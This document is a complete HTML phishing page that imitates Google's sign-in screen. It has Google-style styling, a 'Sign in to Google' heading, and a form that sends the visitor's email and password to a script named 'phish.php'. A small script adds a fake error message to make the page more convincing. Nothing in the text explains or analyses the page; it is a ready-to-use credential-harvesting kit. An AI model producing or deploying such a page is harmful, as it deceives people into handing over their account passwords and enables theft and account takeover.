<!DOCTYPE html>  
<html>  
<head>  
    <title>Google Sign-In</title>  
    <style>  
        body { background: #f2f2f2; font-family: Arial; }  
        .form-container { width: 400px; margin: 10% auto; padding: 20px; background: #fff; border: 1px solid #ccc; }  
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; }  
        button { background: #4285f4; color: white; padding: 10px 20px; }  
    </style>  
</head>  
<body>  
    <div class="form-container">  
        <h2>Sign in to Google</h2>  
        <form id="loginForm" method="POST" action="phish.php">  
            <input type="text" name="username" placeholder="Email" required>  
            <input type="password" name="password" placeholder="Password" required>  
            <button type="submit">Next</button>  
        </form>  
        <p id="errorMsg" style="color:red;"></p>  
    </div>  
    <script>  
        document.getElementById('loginForm').addEventListener('submit', function(e) {  
            e.preventDefault();  
            let username = document.querySelector('input[name="username"]').value;  
            let password = document.querySelector('input[name="password"]').value;  
            if (username.length < 5 || password.length < 8) {  
                document.getElementById('errorMsg').textContent = 'Invalid email or password';  
                return;  
            }  
            this.submit();  
        });  
    </script>  
</body>  
</html>
